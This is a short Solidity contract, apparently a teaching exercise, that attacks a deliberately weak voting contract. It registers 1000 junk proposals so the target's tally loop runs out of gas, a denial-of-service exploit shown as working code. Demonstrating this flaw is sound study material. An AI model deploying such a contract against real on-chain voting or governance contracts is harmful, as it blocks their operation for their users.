// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.2;

import "./Voting_Weak.sol";
import "@openzeppelin/contracts/utils/Strings.sol";
 
/** @dev Ce contrat d'attaque a pour but de surcharger le tableau de proposals afin de rendre son parcours impossible par la fonction tally du fait de l'explosion des gas
*/
contract Voting_Hack {
    Voting_Weak contract_attacked;

    constructor(address _contractVaultAddress) payable {
        contract_attacked = Voting_Weak(_contractVaultAddress);
    }
 
    function attack() public payable {
        for (uint i=0; i<1000; ++i) {
            string memory proposal = string.concat("attack", Strings.toString(i));
            contract_attacked.registerProposals(proposal);
        }
    }
    

}